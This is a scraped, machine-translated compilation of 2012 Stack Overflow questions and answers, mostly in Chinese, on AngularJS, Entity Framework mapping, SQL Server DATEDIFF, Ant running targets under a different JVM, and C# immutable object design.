# javascript - Angularjs：控制器的代码组织

> ID：11955466
> 
> 赞同：3
> 
> 时间：2012-08-14T15:14:27.660
> 
> 标签：javascript, project-organization, angularjs

我使用了角种子（带有文件 index-async.html（异步加载的依赖项））来启动我的 Web 项目，但我的控制器需要进行一些重组。我现在有 3 个充满控制器的文件（700 多行）。如果我将控制器重新组织为 10 个文件（将来还会更多），是否有一种优雅的方式来加载我的控制器。

此外，更多的文件意味着更少的合并冲突（是的！！！）

提前谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:46:30.630

我广泛使用`angular.module().controller()`语法按模块对我的控制器进行分组，这极大地改进了我的角度代码的组织。作为一个额外的好处，您的控制器不再是全局名称空间函数。

[您可以在Module API 文档](http://docs.angularjs.org/api/angular.Module)中阅读更多内容。

# oracle - 使用 owb 获取整个分区

> ID：11955471
> 
> 赞同：0
> 
> 时间：2012-08-14T15:14:36.573
> 
> 标签：oracle, oracle-warehouse-builder

我正在从事 OWB 项目。我的来源是每月分区的表。我有一个包含上次运行日期的 control_table。我想使用 OWB 将整个分区（每月）数据提取到登陆表中，享受性能。请协助提出**OWB 将分区视为其来源**的方式。
谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T08:40:58.903

我不认为这是一个好主意。

只需在 OWB 中实现您的逻辑即可。如果分区可用，OWB/Oracle 将使用它们来获得任何可能的好处。

如果不使用分区，则分区策略应该有问题。尝试更正分区策略。

分区应该是透明的。

# entity-framework - 实体框架和数据绑定

> ID：11955472
> 
> 赞同：1
> 
> 时间：2012-08-14T15:14:39.677
> 
> 标签：entity-framework, foreign-key-relationship

我有两个使用 codefirst 实体框架构建的表。

```
public class TimeEntry:Entity
{
    [Required]
    [Display(Name = "Activity")]
    public int ActivityId { get; set; }

    public virtual Activity Activity { get; set; }  
}

public class Activity:Entity
{
    private ICollection<TimeEntry> _timeEntries;

    [Required]
    public string Description { get; set; }

    public virtual ICollection<TimeEntry> TimeEntries
    {
        get
        {
            return _timeEntries ?? (_timeEntries = new List<TimeEntry>());
        }
        set
        {
            _timeEntries = value;
        }
    }
}
public class Entity
{
    public int Id { get; set; }
} 
```

这些是我为我的 Db 创建的类。创建数据库没有问题。当我尝试执行 CRUD 操作时出现错误

> DataBinding：“System.Data.Entity.DynamicProxies.Activity_AD12BF558F098271F1F51B3B1489B4B3B281FD0B686C8457333DE5BEE0E8B6A9”不包含名为“ActivityId”的属性

它试图在 Activity 表中找到 ActivityId，但主键是 Id。如何将 TimeEntry 表中的外键 ActivityId 映射到 Activity 表中的主键 Id。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:25:32.163

您可以使用 fluent api 让 EF 了解您的映射。

```
public class ActivityMap : EntityTypeConfiguration<Activity>
{
    public ActivityMap()
    {
         this.HasKey(a => a.Id);
    }
}

public class TimeEntryMap : EntityTypeConfiguration<TimeEntry>
{
    public TimeEntryMap()
    {
        this.HasKey(t => t.Id);
        // Relationships
        this.HasRequired(t => t.Activity)
            .WithMany(t => t.TimeEntries)
    }            .HasForeignKey(d => d.ActivityId);
} 
```

然后在您的上下文中：

```
public class MyDbContext : DbContext
{
    protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        modelBuilder.Configurations.Add(new ActivityMap());
        modelBuilder.Configurations.Add(new TimeEntryMap());
    }
} 
```

我认为这将解决您的问题。

此外，（作为旁注）而不是定义`_timeEntries`，您可以使用自动实现的属性`TimeEntries`并在您的ctor中对其进行初始化。如下所示：

```
public class Activity:Entity
{
    public virtual ICollection<TimeEntry> TimeEntries { get; set; }
    public Activity()
    {
        this.TimeEntries = new List<TimeEntry>();
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-07-05T15:27:16.257

嗨我有同样的问题

1.  如果将 DataKeyNames 属性指定为 ID，则实际列名是 CustomerID。它会抛出上述错误。

2.  如果将 DataTextField 或 DataValueField 属性指定为 ID，则实际列名称为 CustomerID。它会抛出上述错误。

并在这里找到了答案，它对我 [有用链接](http://www.aspsnippets.com/Articles/Exception---DataBinding-System.Data.DataRowView-does-not-contain-a-property-with-the-name-x.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:28:51.037

如果您使用 Code First，则需要通过[在 DbContext 中覆盖 OnModelCreating](https://stackoverflow.com/questions/6061994/entity-framework-4-1-code-first-mapping-columns)来指示 ActivityId => Id 的映射。

根据建议，您似乎将 DTO 和 MVC ViewModel 的关注点混合在同一个实体中。为什么不将这些关注点分成 2 个不同的实体呢？

# java - 如何判断监听器是否已经在运行？

> ID：11955475
> 
> 赞同：0
> 
> 时间：2012-08-14T15:14:49.927
> 
> 标签：java

我正在向我的 Singleton 类添加一个事件侦听器。我在 add 方法中添加侦听器。

```
 public void add(TCComponentItemRevision tcRevision, TCComponentDataset selectedDataset) {
  String revMasterForm;

  tcRevision.getSession().addAIFComponentEventListener(this);

  try {
     revMasterForm = tcRevision.getRelatedComponent("IMAN_master_form_rev").getUid();
     RevDataset pp = new RevDataset(tcRevision, selectedDataset, revMasterForm);
     if (!rds.contains(pp)) {
        rds.add(pp);
     }     
  }
  catch (TCException e) {

     e.printStackTrace();
  }

  fireTableDataChanged();
} 
```

我只希望列表器添加一次。所以我认为必须进行某种检查。就像是

```
if (listener value == null) {
    tcRevision.getSession().addAIFComponentEventListener(this);
} 
```

但我不确定如何获得监听器值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:20:17.483

我不知道`TCComponentItemRevision`类是什么，但由于这段代码无论如何都在 Sigleton 内，您可以`boolean addedListener`在 Sigleton 内使用 a 来检查是否添加了侦听器：

```
if (!addedListener) {  
    tcRevision.getSession().addAIFComponentEventListener(this);  
    addedListener = true;  
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:21:01.417

事件侦听器通常不会“运行”。它们被它们“收听”的项目“调用”或（有时）被框架调用。

它们被称为“侦听器”而不仅仅是聚合对象集合的原因是因为附加和删除“侦听”对象的接口是由一个对具体类不做任何假设的接口定义的。相反，回调操作仅通过接口（或很少有抽象类）发生。

现在，对于任何课程，也许课程确实“运行”，但这完全独立于听力方面。

--- 编辑了关于只添加一次监听器的建议 ---

由于负责添加侦听器的对象通常不是正在侦听的代码的一部分，为什么不在决定将自己添加为侦听器之前让“添加”对象查询侦听器呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:29:16.923

侦听器模式要求会话（由 getSession 返回）维护正在侦听它的事物的集合。当会话发生变化时，它会通过这个集合并告诉每个监听器它发生了变化。它通过在每个侦听器上调用一个方法来做到这一点。允许侦听器在该方法中运行它想要的任何代码。

如果您试图确保您没有多次注册监听，您可以尝试访问该集合（这可能实际上是一个数组）。如果您可以访问该数组，那么在调用 tcRevision.getSession().addAIFComponentEventListener(this); 之前 您将遍历数组并检查是否有任何条目是“this”。我的建议看起来像这样：

```
boolean alreadyAdded = false;
for(AIFComponentEventListener currentListener: tcRevision.getSession().getAIFEventListeners()){
    if(currentListener == this){
        alreadyAdded = true;
    }
}
if( ! alreadyAdded ){
    tcRevision.getSession().addAIFComponentEventListener(this);
} 
```

Note that I'm guessing that there is a method called getAIFEventListeners. If there isn't, there may be a method with a different name but the same behavior. If the session has no such method, then you're forced to use another more complicated approach (such as keeping a list of sessions which you're already listening to.

Hope this helps!

# c++ - 使用指向类 T 成员的函数指针作为模板类函数中的参数的错误做法 ?

> ID：11955476
> 
> 赞同：2
> 
> 时间：2012-08-14T15:14:58.210
> 
> 标签：c++, templates, function-pointers, member-function-pointers

首先，对不起标题。我无法真正将我想要问的内容浓缩成一句话:(

我正在阅读[这篇文章](https://stackoverflow.com/questions/11951071/good-design-for-delegating-template-member-functionality)，它以某种方式让我想到了函数指针。具体来说，我想知道为什么将类成员函数作为函数参数传递，然后在该函数中的现有对象上使用该指针是“不好的”（或者至少很少见）。

假设我有一个模板类“Container”，它存储了一个类型为 T 的变量，并提供了一种方法来获取对该变量的 const 引用。

```
template<class T>
class Container {
public:
    Container(T anObject) {
        m_data = anObject;
    }
    const T& getData() const {
        return m_data;
    }
private:
    T m_data;
}; 
```

现在，我希望能够在 m_data 上执行 T 的成员函数，但我不想让 getData() 成为非 const，因为这会导致返回引用的各种其他恶作剧。我的解决方案是在Container中添加一个新的公共函数modifyData(...)，它将一个指向T的成员函数的函数指针作为参数，并在m_data上执行；像这样：

```
// ...
void modifyData( void(typename T::*funcptr)(void) ) {
    (m_data.*fptr)();
}
// ... 
```

按原样，如果 T 是指针，这将崩溃并烧毁。为了测试，我刚刚创建了一个专门的模板`Container<T*>`来解决这个问题，但我相信会有更优雅的方法。

一个非常容易理解的示例表明这似乎按预期工作：

```
// example class to be used with Container
class Data {
public:
    Data() {m_count = 0; }
    void incrementCount() { m_count++; }
    int getCount() const { return m_count; }
private:
    int m_count;
};

// ... in main.cpp:
Data dat;
Container<Data*> DCont(dat);
std::cout << cl.getData()->getCount() << std::endl; // outputs 0
DCont.modifyData<Data>(&Data::incrementCount);
std::cout << cl.getData()->getCount() << std::endl; // outputs 1

// compiler catches this:
// DCont.modifyData<SomeOtherClass>(&Data::incrementCount); 
// this probably does something bad:
// DCont.modifyData<SomeOtherClass>(&SomeOtherClass::someFunc); 
```

现在，本能地这似乎是一种非常扭曲的做事方式，而且我从未见过像这样工作的代码。但我的问题是，这样的事情是否有性能/安全原因是不好的，还是只是被认为是不好的做法？如果这是“只是”不好的做法，那为什么呢？

我能想到的明显限制是 // DCont.modifyData(&SomeOtherClass::someFunc); 可能会在运行时崩溃，但我认为可以通过在 incrementData() 中根据 T 检查 U 的类型来解决这个问题。同样，modifyData 仅接受 void (*)() 函数，但这可能可以通过可变参数模板来解决。

这个例子显然是非常解释的并且没有很好地实现，但我认为（希望？）它足以解释我在说什么。

谢谢！

**编辑：**问题是什么似乎有些混乱。基本上，这就是我正在谈论的场景：您有一堆来自某个库的类，您试图将它们存储在容器中，以及另一个生成某些容器的函数；现在，您希望用户能够在这些容器内的对象上调用现有成员函数，但不能修改实际对象（例如在使用 getter 返回非常量引用时）。实际的实现可能会使用某种有用的可变参数模板，但在发布示例代码之前，我需要考虑更多。

简而言之，我想将用户对容器成员的访问限制为仅限该成员的成员函数。有没有更简单的方法可以做到这一点，或者这种方式不符合我的预期？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:26:38.243

我对您的架构没有任何问题-我不认为这是不好的做法。对我来说，保护数据似乎是一种相当费力的方式，并且对您没有太大帮助，因为用户可以使用任何 void 函数来修改包含的数据；这实际上并不是关于什么可以更改和不可以更改的合同。

我认为这种构造如此罕见的原因是您对容器类的要求和目标是不寻常的。

# c - GstBuffer 像素类型（确定 BPP）

> ID：11955479
> 
> 赞同：1
> 
> 时间：2012-08-14T15:15:02.893
> 
> 标签：c, gstreamer

我正在尝试编写一个 GStreamer (0.10.34) 插件。我需要操纵传入的图像。我将接收器上限设置为“video/x-raw-yuv”，所以我知道我会收到视频。

我无法理解如何使用 GstBuffer，更具体地说：

*   如何获得每像素的位数？
*   给定 bpp，我如何确定缓冲区的尺寸？

我目前正在阅读有关 GstStructure 和 GstQuarks 的 0.10.34 核心文档……我认为我在错误的领域。

一如既往，感谢您的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T17:08:24.903

经过一些源代码搜索 (jpegenc)，我找到了 BaseLib 插件，最重要的是 GstVideo。这为您提供了功能`gst_video_format_parse_caps`

GstVideoFormat 似乎是您用来解析传入视频信息的格式。

# sql - 对 DATEDIFF 函数的第二个参数感到困惑

> ID：11955481
> 
> 赞同：6
> 
> 时间：2012-08-14T15:15:11.237
> 
> 标签：sql, sql-server-2008-r2

我[在 MSDN 上提到过这个，](http://msdn.microsoft.com/en-us/library/aa258269%28v=sql.80%29.aspx)但我仍然不确定 DATEDIFF 函数中的第二个参数在以下两个示例中做了什么：

`SELECT DATEDIFF(yy,0,getdate())` --在 8 月 14 日运行，返回 112

`SELECT DATEDIFF(yy,1000,getdate())` --我任意选择 1000 并在 8 月 14 日运行，返回 110

通常我会用它`DATEDIFF`来查找两个月之间的天数或年数，然后第二个参数是日期。

我想了解以上内容的原因是最终了解以下内容：

`SELECT DATEADD(yy, DATEDIFF(yy,0,GETDATE()), 0)`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-14T15:18:44.183

如果您使用整数作为第二个参数（或任何 datetime/smalldatetime 分配），这将被解释为自 1900-01-01 以来的天数。

```
DECLARE @d1 DATETIME = 0, @d2 DATETIME = 1;
SELECT @d1, @d2; 
```

结果：

```
1900-01-01 00:00:00.000    1900-01-02 00:00:00.000 
```

请注意，这不适用于`DATE`直接分配期间的新数据类型：

```
DECLARE @d DATE = 0; 
```

结果：

> 消息 206，级别 16，状态 2，第 1 行
> 操作数类型冲突：int 与日期不兼容

但它仍然可以使用日期数学，例如：

```
DECLARE @d DATE = DATEADD(YEAR, 0, SYSDATETIME());
SELECT @d; 
```

结果：

```
2012-08-14 
```

由于这些不一致的原因，我建议您使用正确的日期文字，以便清楚您的意思是哪个日期，并且无论数据类型如何，它都能正常工作。这是一个我很难改掉的习惯，因为输入 0 比`19000101`...

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2017-08-07T17:52:07.980

考虑下面的例子来更好地理解这个概念。0 是默认日期`"1900-01-01"`

下面的查询给出的输出为**`2017-10-31 00:00:00.000`**

```
SELECT    DATEADD(DAY, -1, DATEADD(MONTH, DATEDIFF(MONTH,0,SYSDATETIME())+3, 0)) 
```

把上面的查询分成不同的部分来理解计算。

```
-- 1414 Months since '1900-01-01'
    SELECT DATEDIFF(MONTH,0,SYSDATETIME())  + 3 

-- adding 1414 Months to Default date 1900 Produces '2017-11-01 00:00:00.000'
    SELECT DATEADD(MONTH, DATEDIFF(MONTH,0,SYSDATETIME())+3, 0) 

--Subtract 1 day from '2017-11-01 00:00:00:000' gives last day of previous month.
    SELECT DATEADD(DAY, -1, DATEADD(MONTH, DATEDIFF(MONTH,0,SYSDATETIME())+3, 0)) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:18:02.610

datediff() 的第二个参数是日期。

第一个示例返回 SQL Server 世界中的“开始”时间日期。那将比当前日期早 112 年。

第二个例子是相当荒谬的。在实施时，日期表示为自最早日期以来的天数。这是自最早日期后 1000 天以来的年数。

最后一个示例向基准日期添加了年数。然后它增加了几个月。由于基准日期是 1900 年 1 月 1 日，因此这为您提供了第 y 年第 n 个月之后的第一个日期。

# c# - C# 字典反序列化

> ID：11955482
> 
> 赞同：2
> 
> 时间：2012-08-14T15:15:21.677
> 
> 标签：c#, serialization, xna

我有一个名为 tileSet 的可序列化类，其中包含一个字典（ushort，Tile）。所述字典中的 Tile 类也是可序列化的，并且在其中包含一个字典（字符串，矩形 []）。

问题是当我去反序列化 tileSet 的实例时，而在 Tile 的反序列化构造函数中，尽管使用 SerializationInfo.GetValue 设置了 tile 的字典（字符串，矩形 []），但仍保持计数 = 0。

奇怪的是，一旦我们离开了 Tile 的反序列化构造函数，tileSet 就被完全反序列化了；我们看到 Tile 的 dictionary(string,Rectangle[]) 现在已正确填充。

有人对这种延迟有解释吗？（下面的淡化代码）

TileSet 反序列化：

```
Stream stream = File.Open(path, FileMode.Open);
BinaryFormatter bFormatter = new BinaryFormatter();

// The following line will place us in Tile's 
// Deserialization constructor below
TileSet tileSet = (TileSet)bFormatter.Deserialize(stream);

// If debugging, by this point tileSet's, Tile's dictionary is 
// now properly set with a count of 0.
stream.Close(); 
```

瓦片反序列化构造函数：

```
//Deserialization Constructor
public Tile(SerializationInfo info, StreamingContext sContext)
{
    mAnimations = (Dictionary<string, Rectangle[]>)
                    info.GetValue("animations", 
                                  typeof(Dictionary<string, Rectangle[]>));
    mPaused = false;
    mName = (string)info.GetValue("name", typeof(string));
    mWalkable = (bool)info.GetValue("walkable", typeof(bool));
    mInstanced = (bool)info.GetValue("instanced", typeof(bool));

    setCurrentState((string)info.GetValue("currentState", typeof(string)));
    //By this point mAnimations is not properly set but has a count=0
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-02T09:13:34.980

您可以通过在 ondeserialize 方法/反序列化构造函数中执行此操作来强制字典执行其 OnDeserialization。

```
mAnimations = (Dictionary<string, Rectangle[]>)  
    info.GetValue("animations",
        typeof(Dictionary<string, Rectangle[]>));  
mAnimations.OnDeserialize(this); 
```

# ant - 在不同的jvm中运行ant任务

> ID：11955486
> 
> 赞同：8
> 
> 时间：2012-08-14T15:15:36.090
> 
> 标签：ant, jvm, javac

我们的 ant 构建是使用 Java 1.7.0 for JAVA_HOME 运行的。这样 javac 和所有其他 Java 相关目标默认使用正确的 Java。

但是来自外部供应商的 1 个 ant 目标不支持（或者说存在错误）使用 Java 1.7.0。与 javac 或分叉的 junit 不同，此目标不支持切换 jvm 的参数。

是否可以在不同的 jvm 中运行特定的 ant 目标？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-15T04:15:06.853

为了使[Jeanne Boyarsky](https://stackoverflow.com/users/383936/jeanne-boyarsky)使用[`exec`](http://ant.apache.org/manual/Tasks/exec.html)Ant 任务的建议具体化，以下示例将`exec`任务包装在一个宏中以简化使用各种 JVM 调用目标。请注意，JVM 是使用 Ant 环境变量设置的[`JAVACMD`](http://ant.apache.org/manual/running.html#envvars)。

# 示例项目

```
<?xml version="1.0" encoding="UTF-8"?>
<project name="run-target-with-specified-java-version" default="test">

  <macrodef name="exec-target">
    <attribute name="antfile" default="${ant.file}" />
    <attribute name="target" />
    <attribute name="jvm" default="${java.home}/bin/java" />
    <sequential>
      <exec executable="ant">
        <env key="JAVACMD" value="@{jvm}" />
        <arg line='-f "@{antfile}"' />
        <arg line="@{target}" />
      </exec>
    </sequential>
  </macrodef>

  <target name="echo-java-version">
    <echo message="Java version: ${java.version}" />
  </target>

  <target name="test">
    <exec-target target="echo-java-version" />

    <property name="java1.6"
        location="/usr/lib/jvm/jdk1.6/bin/java" />
    <exec-target target="echo-java-version" jvm="${java1.6}" />
  </target>
</project> 
```

# 输出

```
test:
     [exec] Buildfile: /home/your/project/build.xml
     [exec] 
     [exec] echo-java-version:
     [exec]      [echo] Java version: 1.7.0
     [exec] 
     [exec] BUILD SUCCESSFUL
     [exec] Total time: 0 seconds
     [exec] Buildfile: /home/your/project/build.xml
     [exec] 
     [exec] echo-java-version:
     [exec]      [echo] Java version: 1.6.0
     [exec] 
     [exec] BUILD SUCCESSFUL
     [exec] Total time: 0 seconds

BUILD SUCCESSFUL
Total time: 2 seconds 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-15T02:28:46.700

您可以使用 exec 任务运行构建文件，并将该目标定义为作为参数运行。它可以在不同的 JVM 中运行，因为您可以将 JVM 传递给该 exec 调用。

请注意，您必须重构目标以依赖文件进行通信，而不是设置属性。由于它将在不同的JVM中，它显然不能依赖内存。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-15T04:17:58.517

您可以在不同的 JVM 中运行目标（我们一直这样做）。你只需要使用fork：

```
 <javac srcdir="${src}"
         destdir="${build}"
         fork="yes"
  /> 
```

但我感觉你已经意识到了这一点，那么在你想要的 JVM 中运行外部 ANT 任务怎么样，其余的（假设你还有 3 个 javac 任务）。这可以通过设置属性文件来实现。见[javac 任务](http://ant.apache.org/manual/Tasks/javac.html)

***可以使用不同的编译器。这可以通过设置全局 build.compiler 属性来指定，这将影响整个构建过程中的所有任务***

因此，此属性将影响您的 3 个任务并在您指定的 JVM（例如 1.7）中运行它们，您可以将默认 JAVA_HOME 设置为您的外部库任务需要的任何内容。

# c# - 是否可以创建不可变对象而不在构造函数中传递所有内容？

> ID：11955488
> 
> 赞同：6
> 
> 时间：2012-08-14T15:15:40.923
> 
> 标签：c#

我想让我的类不可变。明显的方法是将所有字段声明为`get; private set;`并在构造函数中初始化所有字段。因此客户端必须在构造函数中提供所有内容。问题是当有大约 10 个或更多字段在构造函数中传递它们时变得非常不可读，因为每个字段都没有标签。

例如，这是非常易读的：

```
info = new StockInfo
        {
            Name = data[0] as string,
            Status = s,
            LotSize = (int)data[1],
            ISIN = data[2] as string,
            MinStep = (decimal)data[3]
        }; 
```

与此相比：

```
new StockInfo(data[0] as string, s, (int) data[1], data[2] as string, (decimal) data[3]) 
```

现在成像我有 10 个或更多参数。

那么我怎样才能使类不可变保存可读性呢？

我建议在使用构造函数时只使用相同的格式：

```
info = new StockInfo(
            data[0] as string,           // Name
            s,                           // Status
            (int)data[1],                // LotSize
            data[2] as string,           // ISIN
            (decimal)data[3]             // MinStep
       ); 
```

你能推荐一些更好的东西吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-14T15:22:21.160

这是使用 C# 的命名参数的方法：

```
var info = new StockInfo
(
    Name: data[0] as string,
    Status: s,
    LotSize: (int)data[1],
    ISIN: data[2] as string,
    MinStep: (decimal)data[3]
); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-14T15:32:43.240

这里有一些选项。您必须决定什么最适合您：

使用带有命名参数的**经典不可变对象**（具有大量构造函数）以提高可读性。（缺点：有些人不赞成有许多构造函数参数。在不支持命名参数的情况下，从其他 .NET 语言中使用可能会很不方便。）

```
info = new StockInfo
           (
             name: data[0] as string,
             status: s,
             ...
           ) 
```

* * *

**通过不可变接口**公开可变对象。（缺点：对象仍然可以通过强制转换来改变。要编写的额外类型。）

```
public interface IStockInfo
{
   string Name { get; }
   string Status { get; }
}

IStockInfo info = new StockInfo
                      {
                          Name = data[0] as string,
                          Status = s,
                          ...
                      } 
```

* * *

公开可变对象的**只读视图**`ReadOnlyCollection<T>`-例如参见。（缺点：要实现的额外类型。创建了额外的对象。额外的间接。）

```
var readOnlyInfo = new ReadOnlyStockInfoDecorator(info); 
```

* * *

公开可变对象的**不可变克隆**。（缺点：要实现的额外类型。创建了额外的对象。需要复制。）

```
var immutableInfo = new ImmutableStockInfo(info); 
```

* * *

使用**[可冻结的对象](http://msdn.microsoft.com/en-us/library/ms750509.aspx)**。（缺点：冻结后的突变尝试直到执行时才会被捕获。）

```
info.Freeze();
info.Name = "Test"; // Make this throw an exception. 
```

* * *

使用**流利风格的构建器**或类似的（缺点：有些人可能不熟悉该模式。要编写大量额外代码。创建大量副本。中间状态可能是非法的）

```
info = StockInfo.FromName(data[0] as string)
                .WithStatus(s) // Make this create a modified copy
                .WithXXX() ; 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-08-14T15:21:40.300

不，这是不可能的。要么你有不可变的对象，要么你想要修改对象的能力。

1.  您可以使用命名参数。
2.  您可以考虑传递其他对象（和组参数），以便一个对象仅包含在某种程度上非常相似的参数。

查看您的代码，我可能还建议您先提取参数，而不是传递像`data[0] as string`您使用`string stockName = data[0] as string;`然后使用的东西`stockName`。这应该使您的代码更具可读性。

如果您将这么多参数传递给对象的构造函数，那么修改您的设计可能是一个好主意。您可能违反了[单一职责原则](http://en.wikipedia.org/wiki/Single_responsibility_principle)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-14T15:23:26.927

> 那么我怎样才能使类不可变保存可读性呢？

您可以使用[命名参数](http://msdn.microsoft.com/en-us/library/dd264739.aspx)：

```
info = new StockInfo(
        name: data[0] as string,
        status: s,              
        lotSize: (int)data[1],  
        isin: data[2] as string,
        minStep: (decimal)data[3]
   ); 
```

请注意，使用对象初始值设定项的目标不是可读性——它们不应被视为构造函数的替代品。始终在构造函数中包含正确初始化类型所需的每个参数是一个非常好的主意。不可变类型*必须*在构造期间通过构造函数或工厂方法传入所有参数。

对象初始化器永远不会与不可变类型一起使用，因为它们通过在构造函数*之后*设置值来工作。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-14T16:30:50.633

更多可能的解决方案：

**约定俗成的不变性**

该对象是可变的，您只需表现良好，并且在设置后永远不会更改它。这对于大多数用途来说是完全不合适的（任何对象一开始是公开的），但对于内部“工人”对象来说可以很好地工作，因为它们使用的地方数量有限（因此你可以使用的地方数量有限）搞砸并改变它们）。

**更深层次**

假设你的真实类有超过 5 个字段（不是那么难读，特别是如果你有一个带有工具提示的 IDE），有些可能是可组合的。例如，如果您在同一个类中有名称、地址和纬度和经度的不同部分，您可以将其分解为名称、地址和坐标类。

在某些此类情况下发生的一个好处是，如果您有很多（我的意思是**很多**，这是值得的，少于几千个，这是浪费时间）这样的对象，并且有一些这样的字段之间是相同的它们，您有时可以以这样一种方式构建它们，即这些共享值在每种情况下都具有相同的对象，而不是不同的相同对象 - 所有可能因别名而出错的事情都不会发生，因为它们毕竟是不可变的。

**生成器类**

例子是`StringBuilder`和`UriBuilder`。在这里，您恰好遇到了问题-您想要不变性的好处，但是至少在某些时候，您希望能够在多个步骤中构造对象。

因此，您创建了一个不同的可变类，它具有等效的属性，但具有 setter 和 getter，以及其他变异方法（`Append()`当然，类似的东西是否有意义取决于类），以及构造不可变类实例的方法.

我已经将它用于其构造函数具有多达 30 个参数的类，因为确实有 30 条不同的信息属于同一问题的一部分。在这种情况下，我调用构造函数的唯一地方是在相应的构建器类中。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-14T17:05:36.817

我建议为“可能可变”的对象提供一个接口可能会有所帮助，其中包括`AsMutable`、`AsNewMutable`和`AsImmutable`方法。不可变对象可以`AsImmutable`通过简单地返回自身来实现。可变对象应`AsImmutable`通过返回使用可变对象作为构造函数参数创建的新不可变对象或已知等效的不可变对象来实现。不可变对象的构造函数应该使用原始内容加载新对象，但调用`AsImmutable`所有可能可变的字段。

可变对象应该简单地返回自身以响应`AsMutable`，而不可变对象应该构造一个新的“浅层”可变对象。如果代码希望改变一个由“可能可变”属性引用的对象，它应该将该属性设置为它的`AsMutable`等价物。

在不可变对象上调用该`AsNewMutable`方法的行为应该类似于`AsMutable`. 在可变对象上调用它可以表现得等同于`AsImmutable.AsMutable`，或者可以创建任何嵌套可变对象的可变克隆（有时两种方法都可能更好，这取决于最终会改变哪些嵌套对象）。

If you use this pattern, you should be able to reap many of the benefits of both immutable objects (most notably, the ability to take a snap shot of a "deep" object without needing to make a "deep" copy), and mutable ones (being able to produce an object by performing many steps on the same instance). Performance may be enhanced by having each a mutable object keep a reference to an immutable object whose state was at some time identical to its own; after constructing an immutable instance, the object could check whether it matches the other and, if so, discard the new instance and return the old one. While this would seem to represent extra work, it could in fact improve performance considerably in the scenario where a mutable object has `AsImmutable` called upon it more than once between mutations. If one calls `AsImmutable` twice on a deep tree structure when most of the tree has in fact not been mutated, having the non-mutated parts of the tree return the same object instances both times would facilitate future comparisons.

Note: If one uses this pattern, one should override `GetHashCode` and `Equals` for the deeply-immutable type, but not the mutable one. Immutable objects which hold identical values should be considered interchangeable and thus equivalent, but mutable objects should not be equivalent to anything but themselves regardless of their values. Note also that some care may be needed if objects hold anything of type `double`, `float`, or `Decimal`, since those types override `Object.Equals` to mean something other than equivalence.

# jquery - 基于 Keeping Event: Sorting of Jquery 同时更新 2 个表

> ID：11955495
> 
> 赞同：1
> 
> 时间：2012-08-14T15:16:13.073
> 
> 标签：jquery, asp.net, sql, linq

当我对菜单进行排序时：=> 保留事件：从鼠标排序 =>

菜单：

```
 Home(1)   News(2)    About(3)    =>    News(2)     Home(1)     About(3) 
```

事件将位置同时保存到两个表中。

我知道使用触发器可以解决这个问题。但是两个表的结构不同。所以，我不能为此使用触发器。

现在，我想插入/更新看起来像两个表。

表格1：

```
 Order
           2
           1
           3 
```

表2：

```
 Order: 213 
```

如何同时更新/插入以上两个表。

很多

这是对两个表进行更新的排序事件，但似乎对 table1 进行了更新

```
 //-------Update for table: Items---------//
            command.Connection = connection;
            command.CommandText = "UpdateItemsOrder";
            command.CommandType = CommandType.StoredProcedure;
            SqlParameter paramUserName = new SqlParameter("@ItemOrder", SqlDbType.VarChar, 255);
            paramUserName.Value = itemOrder;
            command.Parameters.Add(paramUserName);
            //----Update for table: NewOrders(get data from column ItemOrder)--//
            string username = "aloha";
            DemoDataContext dc = new DemoDataContext();
            var strJoin= (from m in dc.Items
                             select m.ItemOrder);
            var result = string.Join("", strJoin.Select(x => x.Value).ToArray());
            var reUpdateOrder = dc.NewOrders.Single(a => a.UserOrder.Equals(username));
            reUpdateOrder.NewItemOrder = result;
            dc.SubmitChanges();
            connection.Open();
            return (command.ExecuteNonQuery() > 0); 
```

它只插入表：项目，而不是从项目中获取数据以更新表：新订单。连接始终打开以进行排序。

请帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T17:36:14.873

这只是一个猜测，但看起来好像`NewOrders`可能没有建立主键..？您可能可以通过用户名选择订单，但如果没有主键，LINQ-to-SQL 将不知道如何在调用时找到更新记录`dc.SubmitChanges();`

此外，您是否有任何特殊原因让 SqlConnection 处于打开状态以进行排序？在某些情况下，这可能会导致线程问题，通常最好留给连接池来处理。

`SubmitChanges()`将打开它自己的连接，因此无需为它保持打开 SqlConnection 。您应该分别处理每个更新：

```
//-------Update for table: Items---------//
using(SqlConnection conn = new SqlConnection(...))
{
    SqlCommand command = new SqlCommand();
    command.Connection = conn;
    command.CommandText = "UpdateItemsOrder";
    command.CommandType = CommandType.StoredProcedure;

    SqlParameter paramUserName = new SqlParameter("@ItemOrder", SqlDbType.VarChar, 255);
    paramUserName.Value = itemOrder;
    command.Parameters.Add(paramUserName);

    conn.Open();
    command.ExecuteNonQuery();
}

//----Update for table: NewOrders(get data from column ItemOrder)--//
string username = "aloha";
DemoDataContext dc = new DemoDataContext();
var strJoin = (from m in dc.Items
               select m.ItemOrder);

var result = string.Join("", strJoin.Select(x => x.Value).ToArray());
var reUpdateOrder = dc.NewOrders.Single(a => a.UserOrder.Equals(username));
reUpdateOrder.NewItemOrder = result;
